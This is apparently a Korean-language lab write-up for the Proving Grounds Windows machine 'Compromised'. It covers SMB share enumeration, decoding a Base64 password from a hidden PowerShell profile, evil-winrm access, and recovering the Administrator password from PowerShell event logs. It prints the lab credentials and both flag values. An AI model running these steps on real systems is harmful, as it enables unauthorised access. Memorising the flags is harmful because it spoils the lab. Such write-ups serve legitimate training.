---
tags:
  - type/machine
  - platform/pg
  - os/windows
  - status/solved
  - tech/svc/smb
  - tech/cred/config-file
  - tech/exec/winrm
  - tech/win/event-log-readers
type: machine
platform: pg
os: windows
ip: 192.168.103.152
ports: [80, 135, 139, 443, 445, 5985]
services: [http, https, microsoft-ds, msrpc, netbios-ssn, ssl/https, wsman]
status: solved
manual_tags: true
tech_count: 4
---

> [!info] 요약
> **Compromised** · Proving Grounds Fundamental · Windows Server 2019 Standard(`COMPROMISED`, 192.168.103.152) · 플래그 2개
> 진입점: 443/tcp 인증서 CN `PowerShellWebAccessTestWebSite` → PSWA 식별 → 익명 SMB 로 비표준 공유 `Users$` 읽기 → 숨김 `profile.ps1` 의 UTF-16LE Base64 디코드 → `scripting` 자격증명 → WinRM 대화형 셸
> 권한상승: `scripting` 이 `BUILTIN\Event Log Readers` 소속 → `Windows PowerShell` 클래식 로그의 `HostApplication=` 줄에서 `powershell -Enc` 블롭 회수 → UTF-16LE Base64 → gzip 해제 → Administrator 비밀번호 → WinRM 재접속
> `local.txt` = `3c1acd15f6e0489621429cfb29c1fa9a`(scripting) · `proof.txt` = `bc8d255a2e4a76fd9182e6dd86a8f8db`(Administrator)
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.103.152

### Initial Access – 숨김 SMB 공유에 Everyone 읽기로 노출된 PowerShell 프로필의 Base64 인코딩 비밀번호 회수

**Vulnerability Explanation:**
- 비표준 공유 `Scripts$`·`Users$` 가 `Everyone` 읽기로 게시(`New-SmbShare -Name 'Users$' -Path C:\Users -ReadAccess 'Everyone'`). 이름 끝의 `$` 는 네트워크 브라우징 목록에서 감추는 표시일 뿐이라 접근 통제 부재 — 공유 목록 요청에는 그대로 응답
- `Users$` 가 `C:\Users` 전체를 지시
  - `scripting` 프로필에는 `icacls C:\users\scripting /grant:r "Everyone:(OI)(CI)R" /t` 로 NTFS 상속 읽기까지 부여
  - 그래서 그 사용자의 홈 디렉터리 전량이 무인증 열람 대상 (두 근거 모두 `Privilege Escalation` 절에 인용한 빌드 스크립트 원문)
- 그 안의 `Documents\WindowsPowerShell\profile.ps1` 이 로그온 비밀번호를 UTF-16LE Base64 문자열로 보유. Base64 는 가역 인코딩이라 비밀 보관 수단으로 무효 — `ConvertTo-SecureString ... -AsPlainText -Force` 로 평문이 복원되는 구조 자체가 원문 노출
- 방어는 `attrib +h` 숨김 속성 하나. 숨김은 표시 제어이지 인가 제어가 아니라 SMB 는 해당 항목을 속성 문자만 덧붙여 나열하고 읽기도 막지 않으므로 은폐 실패
- 같은 공유의 `README.txt` 가 「Encoding is not encryption and this information can be lifted from the logs」로 초기 접근과 권한상승 힌트를 한 문장에 함께 노출

**Vulnerability Fix:**
- `Scripts$`·`Users$` 공유 제거. 필요하면 공유 ACL 을 `Everyone` 이 아닌 지정 계정·그룹으로 축소하고 NTFS ACL 도 함께 축소할 것
- 프로필 스크립트에서 자격증명 제거. 자동화가 자격증명을 요구하면 DPAPI 로 사용자 귀속 암호화(`Get-Credential | Export-CliXml`)나 gMSA 로 대체 — 인코딩은 대안이 아님
- `$` 접미와 숨김 속성을 보안 경계로 취급하지 말 것. 둘 다 표시 제어이지 인가 제어가 아님

**Severity:** High — 무인증 원격 사용자가 대화형 셸 계정을 확보. `scripting` 은 `Remote Management Users` 소속이라 WinRM 로그인이 즉시 성립하고, 같은 계정이 `Event Log Readers` 를 겸해 권한상승 경로까지 동시 개방

**Steps to reproduce the attack:**
1. 전체 TCP 포트 스캔으로 80·135·139·443·445·5985 확인
2. 443/tcp 의 TLS 인증서 CN 에서 PowerShell Web Access 식별
3. `smbclient -N -L //192.168.103.152/` 로 익명 공유 목록 회수 — `Scripts$`·`Users$` 확인
4. `Users$` 에서 `scripting/Desktop/README.txt` 와 숨김 파일 `scripting/Documents/WindowsPowerShell/profile.ps1` 다운로드
5. `profile.ps1` 의 Base64 문자열을 UTF-16LE 로 디코드해 비밀번호 획득
6. 그 자격증명으로 5985/tcp WinRM 대화형 셸 접속 후 `local.txt` 원위치 열람

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.103.152 | TCP: 80, 135, 139, 443, 445, 5985, 49666 |

```bash
ssh kali@10.44.44.128 "nmap -Pn -n --min-rate 3000 -T4 -p- --open -oN ~/PG/Compromised/nmap_allports_quick.log 192.168.103.152"
```

```text
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
49666/tcp open  unknown
```
— 출처: `~/PG/Compromised/nmap_allports_quick.log`

전체 65535 중 65528 포트가 `filtered (no-response)`.

- **방화벽 기본 정책** — 빌드 스크립트가 `blockinbound,blockoutbound` 로 설정하고 tcp 80·443 과 ICMPv4 를 명시적 예외로 등록
- **열린 나머지 포트(135·139·445·5985·49666)의 예외 경로 미특정** — 방화벽 규칙 목록 미회수
- **ICMP echo 는 정상 응답** — 2/2 수신·ttl 125(출처: `~/PG/Compromised/recon-preflight.txt`). `-Pn` 은 호스트 판정 실패 대비 예방 조치이지 필수 조건 부재
- **`--defeat-rst-ratelimit` 경고** — 닫힌 포트가 filtered 로 오보될 수 있다는 뜻이지 RST 억제의 관측이 아님
- **소요** — `--min-rate 3000` 으로 전체 포트 43.90초

서비스·버전 확인은 열린 포트로 좁혀 재실행.

```bash
ssh kali@10.44.44.128 "nmap -Pn -n -sCV -p 80,135,139,443,445,5985,49666 -oN ~/PG/Compromised/nmap_sv.log 192.168.103.152"
```

```text
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/https?
|_ssl-date: 2026-09-09T00:10:55+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2021-06-01T08:00:08
|_Not valid after:  2021-08-30T08:00:08
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49666/tcp open  msrpc         Microsoft Windows RPC
```
— 출처: `~/PG/Compromised/nmap_sv.log` (말미의 `Service Info` 행과 SMB 호스트 스크립트 결과 생략. 원문에 전량 보존)

**443/tcp 의 `commonName=PowerShellWebAccessTestWebSite` 한 줄이 전체 경로의 시작.**

- **80 과 443 의 응답 본문 동일** — 둘 다 IIS 기본 페이지(`Size: 703`). 웹 열거만으로 두 포트를 가르는 것은 불가
- **인증서 주체가 유일한 구분자** — 이름의 `TestWebSite` 는 `Install-PswaWebApplication -UseTestCertificate` 가 생성하는 자기서명 인증서 표기

OS 판정 근거:
- nmap OS 추정 — `Aggressive OS guesses: Windows Server 2019 (92%)` (출처: `nmap-full.txt`)
- SMB 프로토콜 협상 — `Windows 10 / Server 2019 Build 17763 x64 (name:COMPROMISED) (domain:compromised)` (출처: `smb_enum.txt`)
- 셸 확보 후 `systeminfo` — `OS Name: Microsoft Windows Server 2019 Standard` / `OS Version: 10.0.17763 N/A Build 17763` (출처: `harvest_admin.txt`)

세 근거가 같은 결론을 가리켜 **Windows Server 2019 Standard 확정**.

PSWA 로그온 화면(아래 그림 2)이 표시하는 「Windows Server 2016」·「© 2016 Microsoft Corporation」은 실제 OS 와 불일치. **화면 문자열을 버전 판정 근거로 쓰지 말 것.**

80/tcp 는 IIS 기본 페이지 외 콘텐츠 부재. 디렉터리 열거도 `aspnet_client` 대소문자 변형만 반환.

```bash
gobuster dir -u 'http://192.168.103.152:80/' -w '/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt' -k -t 30 -q --no-color --no-progress \
  -x php,txt,html,bak,zip,old -b 404,403 -o '/home/kali/PG/Compromised/gobuster-80.txt'
```

```text
/aspnet_client        (Status: 301) [Size: 163] [--> http://192.168.103.152:80/aspnet_client/]
/.                    (Status: 200) [Size: 703]
/Aspnet_client        (Status: 301) [Size: 163] [--> http://192.168.103.152:80/Aspnet_client/]
/aspnet_Client        (Status: 301) [Size: 163] [--> http://192.168.103.152:80/aspnet_Client/]
/ASPNET_CLIENT        (Status: 301) [Size: 163] [--> http://192.168.103.152:80/ASPNET_CLIENT/]
```
— 출처: `~/PG/Compromised/gobuster-80.txt`

![[파일보관/PG-Compromised-iis-default-80.png]]
*그림 1 — 80/tcp 의 IIS 기본 페이지. 443 도 같은 본문을 반환하므로 두 포트의 구분은 웹 응답이 아니라 TLS 인증서 주체에서만 가능*

- **443/tcp 루트** — 80 과 같은 IIS 기본 페이지(`HTTP/2 200`·703바이트, 출처: `~/PG/Compromised/web-443/root.body`·`root.headers`)
- **PSWA 는 별도 경로** — `/pswa/` 요청이 `/pswa/default.aspx?ReturnUrl=%2fpswa` → `/pswa/en-US/logon.aspx` 로 두 번 리디렉트해 로그온 폼 반환
- 인증서 CN 이 가리킨 애플리케이션이 그 경로에 실재

![[파일보관/PG-Compromised-pswa-logon.png]]
*그림 2 — `/pswa/` 의 PowerShell Web Access 로그온 폼. 자격증명만 확보하면 브라우저에서 바로 PowerShell 세션이 열리는 진입점. 상단의 「Windows Server 2016」과 하단의 「© 2016 Microsoft Corporation」 표기는 실측 OS(Server 2019)와 불일치*

익명 SMB 열거는 **도구마다 결과가 갈림.** `smbclient -L` 만 — 익명(`-N`)과 guest 두 형태 모두 — 공유 목록을 반환하고 `smbmap`·`rpcclient`·`netexec` 는 실패. guest 가 통한 것은 빌드 스크립트가 `net user guest /active:yes` 로 그 계정을 켜 둔 결과.

```bash
smbclient -N -L "//192.168.103.152/"
smbclient -U 'guest%' -L "//192.168.103.152/"
smbmap -H 192.168.103.152 -u '' -p ''
rpcclient -U '' -N 192.168.103.152 -c 'srvinfo;enumdomusers;querydominfo'
```
— 출처: `~/PG/_lib/recon.sh` SMB 절 398~405행 (같은 범위의 `nmap --script smb-enum-shares …`·`nbtscan` 2행 생략. 앞의 두 결과는 아래에, NSE 결과는 그 뒤에 별도 기재)

```text
=== smbclient -L anon ===
do_connect: Connection to 192.168.103.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Scripts$        Disk      
	Users$          Disk      
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available
=== nxc smb ===
SMB                      192.168.103.152 445    COMPROMISED      [*] Windows 10 / Server 2019 Build 17763 x64 (name:COMPROMISED) (domain:compromised) (signing:False) (SMBv1:False)
SMB                      192.168.103.152 445    COMPROMISED      [-] compromised\: STATUS_ACCESS_DENIED
SMB                      192.168.103.152 445    COMPROMISED      [-] Error enumerating shares: Error occurs while reading from remote(104)
=== rpcclient ===
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```
— 출처: `~/PG/Compromised/smb_enum.txt` (`=== smbclient -L guest ===` 절 생략 — 익명 절과 같은 공유 목록 반환. 같은 출력이 `svc/smb-shares-guest.txt` 에도 보존)

```text
[*] Established 1 SMB connections(s) and 0 authenticated session(s)
[!] Something weird happened on (192.168.103.152) Error occurs while reading from remote(104) on line 1015
```
— 출처: `~/PG/Compromised/svc/smbmap-null.txt` (진행 표시 스피너 문자 제거. 그 외 무편집)

- **NSE `smb-enum-shares` 도 공유 미반환** — 호스트 스크립트 결과에 `smb2-time`·`smb2-security-mode` 만 잔존(출처: `~/PG/Compromised/svc/smb-nmap.txt`)
- **`netexec`·`smbmap`·NSE 셋의 침묵은 「익명 접근 차단」의 근거로 성립 부재** — 같은 무자격 조건의 `smbclient -L` 이 목록을 반환했기 때문
- **절단 지점 미특정** — `netexec`·`smbmap` 은 같은 `Error occurs while reading from remote(104)` 로 절단
- **실패는 널세션 경로에 한정** — 뒤에 확보한 자격증명으로 `netexec` 재실행 시 `Scripts$ READ`·`Users$ READ` 로 정상 열거(출처: `~/PG/Compromised/auth_test.txt`)
- 도구 하나의 부정 결과를 부재 근거로 삼으면 이 박스는 여기서 종료

`Scripts$`·`Users$` 는 기본 공유가 아니므로 우선순위 최상. 둘 다 익명 읽기 성립.

```text
=== Scripts$ ===
  defrag.ps1                          A       49  Tue Jun  1 23:57:45 2021
  fix-printservers.ps1                A      283  Tue Jun  1 23:57:45 2021
  install-features.ps1                A       81  Tue Jun  1 23:57:45 2021
  purge-temp.ps1                      A      105  Tue Jun  1 23:57:45 2021
=== Users$ ===
  Administrator                       D        0  Tue Jun  1 23:56:44 2021
  Public                             DR        0  Fri May 28 19:53:18 2021
  scripting                           D        0  Wed Jul 21 00:21:03 2021
=== C$ ===
tree connect failed: NT_STATUS_ACCESS_DENIED
=== ADMIN$ ===
tree connect failed: NT_STATUS_ACCESS_DENIED
```
— 출처: `~/PG/Compromised/smb_shares_anon.txt` (디렉터리 항목 `.`·`..`·`.NET v4.5`·`All Users` 등 상속 항목 생략. 원문에 전량 보존)

`Users$` 하위에서 읽기가 통하는 것은 `scripting` 뿐. `Administrator`·`Public` 은 `NT_STATUS_ACCESS_DENIED`. 다음 단계의 재료가 된 것은 `scripting\Desktop\README.txt` 와 `scripting\Documents\WindowsPowerShell\` 두 항목.

### Initial Access – SMB `Users$` 에서 회수한 프로필 스크립트

`Scripts$` 의 네 스크립트부터 확인. `fix-printservers.ps1` 이 `$password` 변수를 참조하나 정의는 파일 안에 부재 — 정의가 다른 파일에 있다는 신호.

```powershell
$credential = New-Object System.Management.Automation.PSCredential ('scripting', $password)
$spooler = Get-WmiObject -Class Win32_Service -ComputerName (Read-Host -Prompt 'Server Name') -Credential $credential -Filter "Name='spooler'"
$spooler.stopservice()
$spooler.startservice()
```
— 출처: `~/PG/Compromised/loot_scripts/fix-printservers.ps1`

**계정명 `scripting` 이 여기서 확정.** 미정의 `$password` 는 PowerShell 프로필(`profile.ps1`)에서 주입되는 구조. 다음 목표는 그 사용자의 `Documents\WindowsPowerShell\` 로 축소.

`Users$` 의 `scripting` 프로필을 훑어 두 파일 회수. 명령 원문 미보존 — 회수 결과는 `~/PG/Compromised/loot_users/` 에 보존.

```text
=== scripting\Desktop ===
  local.txt                           A       34  Wed Sep  9 09:03:58 2026
  README.txt                          A      249  Tue Jun  1 23:57:45 2021
=== scripting\Documents ===
  WindowsPowerShell                   D        0  Wed Jun  2 00:00:27 2021
```
— 출처: `~/PG/Compromised/smb_users_dirs.txt`

`local.txt` 가 목록에 보이나 SMB 로 읽어 옮긴 값은 채점 대상이 아님(대화형 셸의 원위치 열람 필요). 실제 회수는 WinRM 셸 확보 후 수행.

```text
Please keep your personal shares locked down. Just because it's hidden it doesn't mean it's not accessible. Also, please stop storing passwords in your scripts. Encoding is not encryption and this information can be lifted from the logs. -Security
```
— 출처: `~/PG/Compromised/loot_users/README.txt`

한 문장에 힌트 둘. 「passwords in your scripts / Encoding is not encryption」이 초기 접근, 「lifted from the logs」가 권한상승을 각각 가리킴.

- **숨김 처리** — `WindowsPowerShell\profile.ps1` 에 `attrib +h` 적용(빌드 스크립트에 그 한 줄이 그대로 존재)
- **숨김은 표시 제어일 뿐** — SMB 읽기 차단 부재. 다운로드가 그대로 성립
- **근거** — 같은 목록의 `AppData DH`·`desktop.ini AHS` 처럼 숨김 항목도 속성 문자만 덧붙어 나열(출처: `~/PG/Compromised/smb_users_dirs.txt`)

```powershell
$password = ConvertTo-SecureString "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgByAGkAZQBuAGQAcwBEAG8AbgB0AEwAZQB0AEYAcgBpAGUAbgBkAHMAQgBhAHMAZQA2ADQAUABhAHMAcwB3AG8AcgBkAHMA')))" -AsPlainText -Force
```
— 출처: `~/PG/Compromised/loot_users/profile.ps1`

Base64 문자열의 문자 사이에 널바이트가 들어간 형태(`RgByAGkAZQBuAGQAcw...`)라 인코딩이 UTF-8 이 아니라 **UTF-16LE**. 스크립트 자체가 `[System.Text.Encoding]::Unicode` 로 디코드하므로 같은 방식을 그대로 적용.

```bash
echo 'RgByAGkAZQBuAGQAcwBEAG8AbgB0AEwAZQB0AEYAcgBpAGUAbgBkAHMAQgBhAHMAZQA2ADQAUABhAHMAcwB3AG8AcgBkAHMA' | base64 -d | iconv -f UTF-16LE -t UTF-8
```

```text
FriendsDontLetFriendsBase64Passwords
```
— 출처: `~/PG/Compromised/creds_password.txt`

**수동 대안** — `base64 -d` 출력을 `tr -d '\0'` 로 널바이트만 제거해도 같은 문자열 확보. `iconv` 부재 환경의 대체 경로. 이 박스에서 실행한 형태는 위 `iconv` 쪽.

자격증명 유효성은 WinRM 으로 확인. `scripting` 이 `Remote Management Users` 소속이라 5985/tcp 로그인이 성립.

```bash
nxc winrm 192.168.103.152 -u scripting -p FriendsDontLetFriendsBase64Passwords
```

```text
WINRM                    192.168.103.152 5985   COMPROMISED      [*] Windows 10 / Server 2019 Build 17763 (name:COMPROMISED) (domain:compromised)
WINRM                    192.168.103.152 5985   COMPROMISED      [+] compromised\scripting:FriendsDontLetFriendsBase64Passwords (Pwn3d!)
```
— 출처: `~/PG/Compromised/auth_test.txt` (`=== nxc winrm ===` 절)

같은 자격증명을 PSWA 로그온 폼에도 투입해 웹 경로의 유효성 확인.

![[파일보관/PG-Compromised-pswa-logon-scripting-creds.png]]
*그림 3 — PSWA 로그온 폼에 `scripting` 자격증명 입력. 「Computer name」 필드에 접속 대상(여기서는 대상 자신을 가리키는 `localhost`)을 넣어야 인증이 진행 — 비우면 서버가 `error.aspx` 로 500 반환*

![[파일보관/PG-Compromised-pswa-auth-success-scripting.png]]
*그림 4 — `scripting` 인증 성공. PSWA 가 기존 disconnected Runspace 목록을 표시. 자격증명이 웹·WinRM 양쪽에서 모두 유효함을 확인*

대화형 셸은 evil-winrm 으로 확보. 웹셸이 아닌 pty 세션이라야 플래그가 채점 대상.

```bash
evil-winrm -i 192.168.103.152 -u scripting -p FriendsDontLetFriendsBase64Passwords
```

```text
*Evil-WinRM* PS C:\Users\scripting\Documents> whoami; whoami /groups | Select-String "Event Log Readers|Remote Management"; hostname; ipconfig | Select-String IPv4; Get-Date -Format o; type C:\Users\scripting\Desktop\local.txt
compromised\scripting

BUILTIN\Event Log Readers              Alias            S-1-5-32-573 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
compromised
   IPv4 Address. . . . . . . . . . . : 192.168.103.152
2026-09-08T17:22:14.9174193-07:00
3c1acd15f6e0489621429cfb29c1fa9a
```
— 출처: `~/PG/Compromised/proof_user.txt`

한 명령에 권한·호스트·타깃 IP·시각·플래그를 묶어 실행. 채점 3요건(플래그 내용 · 타깃 IP · 권한)이 한 화면에 공존하고, 프롬프트 `*Evil-WinRM* PS C:\Users\scripting\Documents>` 가 대화형 셸에서의 원위치 `type` 을 입증. 이 단계의 증적은 터미널 출력이므로 코드펜스가 담당.

**Local.txt value:**

```text
3c1acd15f6e0489621429cfb29c1fa9a
```

- 경로 — `C:\Users\scripting\Desktop\local.txt`
- 획득 권한 — `compromised\scripting`

### Privilege Escalation – Event Log Readers 권한으로 읽은 PowerShell 로그의 `-Enc` 블롭 복호

**Vulnerability Explanation:**
- `scripting` 이 `BUILTIN\Event Log Readers` 소속. 이 그룹은 관리자가 아니어도 보안 이벤트를 포함한 이벤트 로그 읽기 권한 보유
- Windows PowerShell 클래식 로그의 엔진·프로바이더 수명주기 이벤트(400 엔진 시작·403 엔진 정지·600 프로바이더 시작)는 **호출자의 전체 명령줄을 `HostApplication=` 필드에 그대로 기록.** `-Enc` 로 전달한 Base64 인수도 예외 없이 원문 보존
- 머신 빌드 스크립트가 Administrator 비밀번호를 gzip 압축 후 Base64 로 감싸 `powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <블롭>` 형태로 한 번 실행. 그 한 번의 실행이 로그에 영구 잔존
- 압축·인코딩·문자코드 배열 난독화가 겹쳐 있으나 전부 가역. 키가 없는 변환은 비밀 보호가 아님
- 결과적으로 **비관리자 계정의 로그 읽기 권한 하나가 로컬 관리자 비밀번호 열람 권한과 동치**

**Vulnerability Fix:**
- 자격증명을 명령줄 인수로 전달하지 말 것. `-Enc`·`-Command` 인수는 PowerShell 클래식 로그에 무조건 잔존하고, 스크립트 블록 로깅·프로세스 생성 감사가 켜져 있으면 `Microsoft-Windows-PowerShell/Operational` 4104 와 보안 로그 4688 에도 중복 잔존
- 필요한 계정에만 `Event Log Readers` 부여. 이 박스처럼 대화형 원격 접속 계정에 함께 주면 로그가 자격증명 저장소로 전락
- 이미 기록된 로그는 회전·삭제로 정리하고, 노출된 관리자 비밀번호는 회전할 것

**Severity:** Critical — 표준 사용자 셸에서 로컬 Administrator 평문 비밀번호 확보. 재익스플로잇 없이 WinRM 재로그인만으로 관리자 셸 성립

**Steps to reproduce the attack:**
1. `whoami /groups` 로 `BUILTIN\Event Log Readers` 소속 확인
2. `Get-WinEvent -ListLog *` 로 읽을 수 있는 로그와 레코드 수 확인
3. `Windows PowerShell` 로그에서 `HostApplication=` 를 포함한 메시지 추출
4. `-Enc` 인수의 Base64 블롭을 UTF-16LE 로 디코드
5. 디코드 결과의 `FromBase64String("H4sI...")` 를 다시 Base64 디코드 후 gzip 해제
6. 얻은 Administrator 비밀번호로 WinRM 재접속

권한상승 열거는 소속 그룹 확인에서 시작.

- **특권 목록에 악용 가능한 것 부재** — `SeChangeNotifyPrivilege`·`SeIncreaseWorkingSetPrivilege` 둘뿐. 그룹 쪽이 유일한 단서
- **이하 열거의 실행 경로** — evil-winrm pty 가 아니라 `nxc winrm -X` 비대화형 실행기(래퍼 `~/PG/Compromised/wr.sh`) 경유. 출력에 셸 프롬프트 부재

```powershell
whoami /all
```

```text
GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Event Log Readers              Alias            S-1-5-32-573 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```
— 출처: `~/PG/Compromised/enum_whoami.txt` (선두 3행의 실행기 출력, `USER INFORMATION` 절, `NT AUTHORITY` 계열 그룹과 Mandatory Label 행 생략. 원문에 전량 보존)

- **`Event Log Readers` 와 README 의 「lifted from the logs」가 같은 곳을 지시**
- **일괄 열거 스크립트는 이 조합을 미포착** — `systeminfo` 가 `ERROR: Access denied` 로 막히고 서비스·서비스 바이너리 ACL·스케줄 작업 등 CIM 의존 절이 전부 공란(출처: `~/PG/Compromised/harvest_scripting.txt`)
- 결정적 단서는 그룹 목록 한 줄

> [!note] 왜 클래식 로그를 보는가
> PowerShell 은 두 계통에 남김. `Microsoft-Windows-PowerShell/Operational` 4104 는 **스크립트 블록 본문**을, `Windows PowerShell` 클래식 400/403/600 은 **호출자의 명령줄 전체**를 기록. 빌드 스크립트 본문은 4104 쪽에서, 관리자 비밀번호를 담은 `-Enc` 인수는 클래식 쪽 `HostApplication=` 에서 나옴. 한쪽만 보면 절반을 놓침.

읽을 수 있는 로그와 레코드 수 확인.

```powershell
Get-WinEvent -ListLog * | Where-Object { $_.LogName -match 'PowerShell' }
```

```text
LogName                                  RecordCount IsEnabled
-------                                  ----------- ---------
Windows PowerShell                               154      True
Microsoft-Windows-PowerShell/Operational         340      True
```
— 출처: `~/PG/Compromised/enum_logs2.txt`

`Operational` 340건에서 빌드 스크립트 전문을 회수(`~/PG/Compromised/build-script-from-eventlog.txt` 204행 중 41~199행. 앞뒤는 인접한 다른 스크립트블록). 자격증명 세 개가 평문으로 선언돼 있고, 이 박스의 설계 전체가 여기 드러남.

```powershell
# PG Submission - Compromised

$user = 'scripting'
$userpass = 'FriendsDontLetFriendsBase64Passwords'
$adminpass = 'TheShellIsMightierThanTheSword!'
```
— 출처: `~/PG/Compromised/build-script-from-eventlog.txt`

빌드 스크립트가 `-Enc` 블롭을 만들어 심는 부분. 이 코드가 클래식 로그에 남길 형태를 그대로 규정.

```powershell
[System.String]$Decoder = $Decoder -replace "<Base64>", "$EncodedGzipStream"
[byte[]]$bytes = [System.Text.Encoding]::Unicode.GetBytes($Decoder)
[System.String]$EncodedCommand = [Convert]::ToBase64String($bytes)

# Plant our command in the logs
Start-Process powershell -argumentlist "-NoP -NonI -W Hidden -Exec Bypass -Enc $EncodedCommand"
```
— 출처: `~/PG/Compromised/build-script-from-eventlog.txt`

클래식 로그에서 `HostApplication=` 줄을 추출. 명령 원문 미보존 — 아래는 같은 결과를 내는 재구성 형태이고, 회수 산출물은 `~/PG/Compromised/log_winps_hostapp.txt`(109KB).

```powershell
Get-WinEvent -LogName 'Windows PowerShell' -MaxEvents 200 | ForEach-Object { $_.Message } | Select-String 'HostApplication='
```

```text
HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABPAHcAbgBlAGQAIAA9ACAAQAAoACkAOwAkAE8AdwBuAGUAZAAgACsAPQAgAHsAJABEAGUAYwBvAGQAZQBkACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AE
```
— 출처: `~/PG/Compromised/log_winps_hostapp.txt:1776` (블롭 전체 3886자 중 선두 절단. 전량은 `enc_blob.txt`)

같은 로그의 `HostApplication=` 줄은 154개이고, 최다는 인수 없는 `powershell.exe` 96개이며 정기 실행 `C:\freezeScript\win10.ps1` 이 8개로 둘 다 무관. `-Enc` 인수를 가진 줄은 고유 1종이 8회 반복 — 걸러야 할 것이 그 한 종.

디코드는 두 겹. 겉은 UTF-16LE Base64, 안쪽 `FromBase64String("H4sI...")` 는 gzip 스트림 형태.

```python
import base64,re,gzip,io
b=open('/home/kali/PG/Compromised/enc_blob.txt').read().strip()
b+='='*((4-len(b)%4)%4)
d=base64.b64decode(b).decode('utf-16-le',errors='replace')
open('/home/kali/PG/Compromised/enc_decoded.txt','w').write(d)
print('decoded len',len(d))
m=re.search(r'FromBase64String\("(H4sI[A-Za-z0-9+/=]+)"\)',d)
print('gzip b64:',m.group(1))
g=base64.b64decode(m.group(1))
print('ADMINPASS:',gzip.GzipFile(fileobj=io.BytesIO(g)).read().decode())
```
— 출처: `~/PG/Compromised/dec.py`

```text
decoded len 1457
gzip b64: H4sIAAAAAAAEAAvJSA3OSM3J8Sz2zUzPKMlMLQrJSMwLAYqW5xelKAIA07xkHB8AAAA=
ADMINPASS: TheShellIsMightierThanTheSword!
```
— 출처: `~/PG/Compromised/adminpass.txt`

- **1단계 디코드 결과** — `$Owned = @();$Owned += {...}` 형태의 스크립트블록 배열
- **그 안에 섞인 난독화 둘** — 문자코드 정수 배열(`(83,116,97,114,116,45,83,108,101,101,112,...)` = `Start-Sleep -Seconds 5`)과 `(gv "*mdr*").name[3,11,2]-join''` = `iex` 우회(출처: `enc_decoded.txt`)
- **난독화 계층을 순서대로 벗길 필요는 부재** — 필요한 것은 gzip 블롭 하나. 정규식으로 `H4sI` 로 시작하는 문자열만 뽑아 압축 해제

**수동 대안** — `H4sI` 블롭만 잘라 `base64 -d | gunzip` 으로 동일 결과. Python 없이도 성립.

복호한 Administrator 비밀번호를 PSWA 로그온 폼에도 투입. 다만 이 경로는 미완 — PSWA 게이트웨이가 `gateway cannot establish a connection` 을 반환해 세션 수립에 실패(원인 미특정). 자격증명 유효성이 실제로 확인된 것은 아래 WinRM 경로.

![[파일보관/PG-Compromised-pswa-logon-administrator-creds.png]]
*그림 5 — Administrator 자격증명을 입력한 PSWA 로그온 폼. 인증 성공 화면은 게이트웨이 오류로 미확보이므로 이 그림이 보이는 것은 투입 시점까지*

### Post-Exploitation

관리자 셸은 같은 evil-winrm 경로로 재접속해 확보. `proof.txt` 는 `C:\Users\Administrator\Desktop\` 에서 원위치 `type` 으로 열람 — 파일 이동·다운로드 경유 부재.

```bash
evil-winrm -i 192.168.103.152 -u Administrator -p 'TheShellIsMightierThanTheSword!'
```

```text
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami; whoami /groups | Select-String Administrators; hostname; ipconfig | Select-String IPv4; Get-Date; type C:\Users\Administrator\Desktop\proof.txt
compromised\administrator

NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
compromised
   IPv4 Address. . . . . . . . . . . : 192.168.103.152

DisplayHint : DateTime
Date        : 9/8/2026 12:00:00 AM
Day         : 8
DayOfWeek   : Tuesday
DayOfYear   : 251
Hour        : 17
Kind        : Local
Millisecond : 214
Minute      : 20
Month       : 9
Second      : 29
Ticks       : 639244848292142959
TimeOfDay   : 17:20:29.2142959
Year        : 2026
DateTime    : Tuesday, September 8, 2026 5:20:29 PM

bc8d255a2e4a76fd9182e6dd86a8f8db
```
— 출처: `~/PG/Compromised/proof_root.txt`

**Proof.txt value:**
`bc8d255a2e4a76fd9182e6dd86a8f8db`

- 경로 — `C:\Users\Administrator\Desktop\proof.txt`
